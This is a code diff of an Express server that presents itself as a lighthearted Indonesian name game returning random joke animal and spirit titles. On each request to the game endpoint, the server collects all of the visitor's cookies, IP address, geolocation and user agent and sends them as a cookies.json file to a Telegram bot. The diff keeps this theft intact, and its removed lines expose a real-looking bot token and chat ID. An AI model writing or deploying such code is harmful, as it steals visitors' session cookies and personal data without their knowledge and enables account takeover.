@@ -1,62 +1,61 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const cors = require('cors'); // Import middleware CORS
+const cors = require('cors');
 const fetch = require('node-fetch');
-const FormData = require('form-data'); // Import FormData
-const useragent = require('user-agent'); // Import user-agent parser
-const requestIp = require('request-ip'); // Import request-ip
-const geoip = require('geoip-lite'); // Import geoip-lite
+const FormData = require('form-data');
+const useragent = require('user-agent');
+const requestIp = require('request-ip');
+const geoip = require('geoip-lite');
+
 const app = express();
 
-// Middleware untuk parse application/json
+// Middleware to parse application/json
 app.use(bodyParser.json());
-
-// Gunakan middleware CORS
 app.use(cors());
+app.use(requestIp.mw()); // Middleware to get client IP
 
-// Data array yang berisi kata-kata yang akan diambil secara acak
-const data = ['Tidak Ada',
-    "Harimau Biskuat", "Nyi Ngaborong", "Jin Sarimi", "Maung Ompong",
-    "Gajah Bule", "Kelinci Pitih", "Kambing Hitam", "Bebek Sumberkencono",
-    "Ikan Bakar", "Kucing Nakal", "Laba-Laba Sutra", "Ular Kejut",
-    "Burung Kutang", "Sapi Perah", "Kuda Lumping", "Kuda Laut",
-    "Ayam Geprek", "Cacing Ganteng","Dino Jahat","Dino Jahat","Dino Jahat","Dino Jahat", "Buaya Darat", "Kucing Garong",
-    "Unta Gila", "Tikus Got", "Kambing Guling", "Babi Ngepet","Dino Jahat",
-    "Ular Madu", "Ayam Kampus", "Gajah Mada", "Kodok Ngorek",
-    "Anjing Gukguk", "Kera Sakti", "Burung Cendrawasih", "Kadal Gurun",
-    "Biawak Air", "Tupai Terbang", "Lele Jumbo", "Belut Listrik","Dino Jahat","Dino Jahat","Dino Jahat","Dino Jahat",
-    "Kura-Kura Ninja", "Ikan Tongkol", "Kucing Manja", "Bebek Balap",
-    "Burung Hantu", "Serigala Malam", "Ikan Pari", "Kodok Terbang",
-    "Ayam Cemani", "Banteng Merah", "Gorila Sakit Gigi", "Ular Sanca", "Ular Kobra",
-    "Rusa Kutub", "Burung Kolibri", "Buto Ijo", "Pocong Unyu","Dino Jahat",
-    "Kuntilanak Merah", "Sundel Bolong","Dino Jahat","Dino Jahat", "Genderuwo Keren", "Wewe Gombel",
-    "Tuyul Nakal", "Jelangkung Seram", "Kuntilanak Manis", "Buto Terong",
-    "Jurig Kampring", "Setan Budug", "Hantu Kompor", "Memedi Sawah",  "Kucing Kecurangan", "Macan Ketipu", "Harimau Ketabrak", "Kucing Kekepung", "Macan Keliru", 
-    "Harimau Kembar", "Kucing Kerdil", "Macan Ketangkap", "Harimau Kemaruk", "Kucing Kebagian", 
-    "Macan Ketinggalan", "Harimau Kemben", "Kucing Kepanasan", "Macan Kepanjangan", "Harimau Kembaran", 
-    "Kucing Kekeret", "Macan Keselek", "Harimau Kesurupan", "Kucing Kekampungan", "Macan Kempes", 
-    "Harimau Kelas Teri", "Kucing Keletihan", "Macan Kekeringan", "Harimau Kejang", "Kucing Kera", 
-    "Macan Kerucut", "Harimau Keriting", "Kucing Kesasar", "Macan Kesasar", "Harimau Kentut","Dino Jahat","Dino Jahat"
-    ];
+// Data array containing words to be randomly selected
+const data = [
+    "Tidak Ada", "Harimau Biskuat", "Nyi Ngaborong", "Jin Sarimi", "Maung Ompong", 
+    "Gajah Bule", "Kelinci Pitih", "Kambing Hitam", "Bebek Sumberkencono", 
+    "Ikan Bakar", "Kucing Nakal", "Laba-Laba Sutra", "Ular Kejut", 
+    "Burung Kutang", "Sapi Perah", "Kuda Lumping", "Kuda Laut", 
+    "Ayam Geprek", "Cacing Ganteng", "Dino Jahat", "Buaya Darat", "Kucing Garong", 
+    "Unta Gila", "Tikus Got", "Kambing Guling", "Babi Ngepet", 
+    "Ular Madu", "Ayam Kampus", "Gajah Mada", "Kodok Ngorek", 
+    "Anjing Gukguk", "Kera Sakti", "Burung Cendrawasih", "Kadal Gurun", 
+    "Biawak Air", "Tupai Terbang", "Lele Jumbo", "Belut Listrik", 
+    "Kura-Kura Ninja", "Ikan Tongkol", "Kucing Manja", "Bebek Balap", 
+    "Burung Hantu", "Serigala Malam", "Ikan Pari", "Kodok Terbang", 
+    "Ayam Cemani", "Banteng Merah", "Gorila Sakit Gigi", "Ular Sanca", "Ular Kobra", 
+    "Rusa Kutub", "Burung Kolibri", "Buto Ijo", "Pocong Unyu", 
+    "Kuntilanak Merah", "Sundel Bolong", "Genderuwo Keren", "Wewe Gombel", 
+    "Tuyul Nakal", "Jelangkung Seram", "Kuntilanak Manis", "Buto Terong", 
+    "Jurig Kampring", "Setan Budug", "Hantu Kompor", "Memedi Sawah", 
+    "Kucing Kecurangan", "Macan Ketipu", "Harimau Ketabrak", "Kucing Kekepung", 
+    "Macan Keliru", "Harimau Kembar", "Kucing Kerdil", "Macan Ketangkap", 
+    "Harimau Kemaruk", "Kucing Kebagian", "Macan Ketinggalan", "Harimau Kemben", 
+    "Kucing Kepanasan", "Macan Kepanjangan", "Harimau Kembaran", "Kucing Kekeret", 
+    "Macan Keselek", "Harimau Kesurupan", "Kucing Kekampungan", "Macan Kempes", 
+    "Harimau Kelas Teri", "Kucing Keletihan", "Macan Kekeringan", "Harimau Kejang", 
+    "Kucing Kera", "Macan Kerucut", "Harimau Keriting", "Kucing Kesasar", 
+    "Macan Kesasar", "Harimau Kentut"
+];
 
 app.get('/', (req, res) => {
     res.send('Hello from Express on Vercel!');
 });
-
-// Middleware to get client IP
-app.use(requestIp.mw());
 
 // Function to get all cookies and format them as a JSON object
 function getCookies(req) {
     const cookieHeader = req.headers.cookie;
     if (!cookieHeader) return {};
 
-    const cookies = cookieHeader.split('; ').reduce((acc, cookie) => {
+    return cookieHeader.split('; ').reduce((acc, cookie) => {
         const [name, ...rest] = cookie.split('=');
         acc[name] = decodeURIComponent(rest.join('='));
         return acc;
     }, {});
-    return cookies;
 }
 
 // Function to get client information
@@ -78,14 +77,9 @@ function getClientInfo(req) {
 
 // Function to send message to Telegram bot
 async function sendMessageToTelegram(message) {
-    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
-    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
+    const token = 'YOUR_BOT_TOKEN';
+    const chat_id = 'YOUR_CHAT_ID';
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-    const body = {
-        chat_id: chat_id,
-        text: message
-    };
 
     try {
         const response = await fetch(url, {
@@ -93,7 +87,7 @@ async function sendMessageToTelegram(message) {
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(body)
+            body: JSON.stringify({ chat_id, text: message })
         });
 
         if (response.ok) {
@@ -109,8 +103,8 @@ async function sendMessageToTelegram(message) {
 
 // Function to send data to Telegram bot
 async function sendToTelegram(data, filename, content) {
-    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
-    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
+    const token = 'YOUR_BOT_TOKEN';
+    const chat_id = 'YOUR_CHAT_ID';
     const url = `https://api.telegram.org/bot${token}/sendDocument`;
 
     const formData = new FormData();
@@ -147,9 +141,6 @@ async function exportCookies(req, nama, responseData) {
     };
     const json = JSON.stringify(data, null, 2);
 
-    // Logging untuk memeriksa apakah JSON tidak kosong
-    console.log('Cookies and Client Info JSON:', json);
-
     if (!json || json === '{}') {
         console.error('No cookies or client information found or JSON is empty');
         await sendMessageToTelegram('No cookies or client information found or JSON is empty');
@@ -157,32 +148,24 @@ async function exportCookies(req, nama, responseData) {
     }
 
     const buffer = Buffer.from(json, 'utf-8');
-
-    // Prepare data to send
     const caption = `Nama: ${nama}\nData: ${responseData}`;
     await sendToTelegram(caption, 'cookies.json', buffer);
 }
 
-// Route untuk handle POST request
+// Route to handle POST request
 app.post('/api/data', async (req, res) => {
     const { nama } = req.body;
-
-    // Generate index acak dari array data
     const randomIndex = Math.floor(Math.random() * data.length);
     const responseData = data[randomIndex];
-
-    // Call exportCookies function
     await exportCookies(req, nama, responseData);
 
-    // Kirim response berupa kata acak dari data berdasarkan nama yang diinput
     res.json({
         nama,
         data: responseData
     });
 });
-;
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3003;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
